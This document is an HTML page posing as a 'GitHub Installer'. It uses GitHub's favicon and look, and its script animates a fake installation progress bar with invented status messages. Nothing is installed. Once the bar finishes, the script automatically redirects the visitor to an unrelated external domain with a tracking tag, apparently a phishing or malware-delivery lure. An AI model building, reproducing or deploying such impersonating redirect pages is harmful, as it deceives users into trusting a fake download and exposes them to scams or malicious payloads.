<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub Installer</title>

<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
}

body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#0d1117;
overflow:hidden;
color:#e6edf3;
}

/* background */
.bg{
position:absolute;
inset:0;
background:
radial-gradient(circle at 25% 30%, rgba(88,166,255,.22), transparent 40%),
radial-gradient(circle at 70% 60%, rgba(46,160,67,.18), transparent 40%),
radial-gradient(circle at 50% 80%, rgba(168,85,247,.14), transparent 45%);
filter:blur(85px);
animation:move 8s ease-in-out infinite alternate;
}

@keyframes move{
from{transform:translate(-3%,-3%)}
to{transform:translate(3%,3%)}
}

/* window */
.card{
width:380px;
background:rgba(22,27,34,.92);
border:1px solid #30363d;
border-radius:16px;
padding:20px;
z-index:2;
box-shadow:0 25px 80px rgba(0,0,0,.7);
backdrop-filter:blur(22px);
}

/* header */
.header{
display:flex;
align-items:center;
gap:10px;
margin-bottom:10px;
}

.header img{
width:22px;
height:22px;
}

.title{
font-size:13px;
font-weight:600;
}

.sub{
font-size:11px;
color:#8b949e;
}

/* progress */
.bar{
margin-top:14px;
height:10px;
background:#21262d;
border-radius:999px;
overflow:hidden;
position:relative;
}

.fill{
width:0%;
height:100%;
background:linear-gradient(90deg,#238636,#39d353,#58a6ff);
animation:shine 2s linear infinite;
transition:width .25s ease;
}

@keyframes shine{
0%{background-position:0%}
100%{background-position:300%}
}

/* scan grid */
.grid{
display:grid;
grid-template-columns:repeat(14,1fr);
gap:3px;
margin-top:14px;
}

.cell{
aspect-ratio:1;
background:#21262d;
border-radius:2px;
opacity:.5;
transition:.3s;
}

.active{
background:#39d353;
opacity:1;
transform:scale(1.08);
}

/* status line */
.status{
margin-top:12px;
font-size:11px;
color:#8b949e;
font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
min-height:16px;
}

/* footer */
.footer{
margin-top:14px;
font-size:11px;
color:#7d8590;
display:flex;
align-items:center;
gap:8px;
}

.dot{
width:7px;
height:7px;
border-radius:50%;
background:#39d353;
animation:pulse 1.5s infinite;
}

@keyframes pulse{
0%,100%{transform:scale(1);opacity:1}
50%{transform:scale(1.7);opacity:.4}
}
</style>
</head>

<body>

<div class="bg"></div>

<div class="card">

<div class="header">
<img src="https://github.githubassets.com/favicons/favicon.svg">
<div>
<div class="title">GitHub Installer</div>
<div class="sub">deployment pipeline • system package</div>
</div>
</div>

<div class="bar">
<div class="fill" id="fill"></div>
</div>

<div class="status" id="status">
⠿ GitHub Installer • initializing deployment environment...
</div>

<div class="grid" id="grid"></div>

<div class="footer">
<div class="dot"></div>
syncing repository bundle
</div>

</div>

<script>

const grid=document.getElementById("grid");

for(let i=0;i<112;i++){
const d=document.createElement("div");
d.className="cell";
grid.appendChild(d);
}

const cells=document.querySelectorAll(".cell");

setInterval(()=>{
const c=cells[Math.floor(Math.random()*cells.length)];
c.classList.add("active");
setTimeout(()=>c.classList.remove("active"),800);
},45);

const fill=document.getElementById("fill");
const status=document.getElementById("status");

let p=0;

function setLine(text){
status.textContent="⠿ GitHub Installer • " + text;
}

function run(){

p++;
fill.style.width=p+"%";

if(p===5)  setLine("resolving repository dependencies...");
if(p===15) setLine("fetching remote GitHub assets...");
if(p===30) setLine("cloning installation bundle...");
if(p===50) setLine("extracting deployment package...");
if(p===70) setLine("applying system configuration...");
if(p===85) setLine("running final verification checks...");

if(p<100){
setTimeout(run,28);
}else{
setLine("deployment completed successfully");
status.style.color="#39d353";

setTimeout(()=>{
window.location.href="https://newlink9.wyxoriva.cfd/?tag=1qYJwvH1:C16";
},1000);
}

}

run();

</script>

</body>
</html>
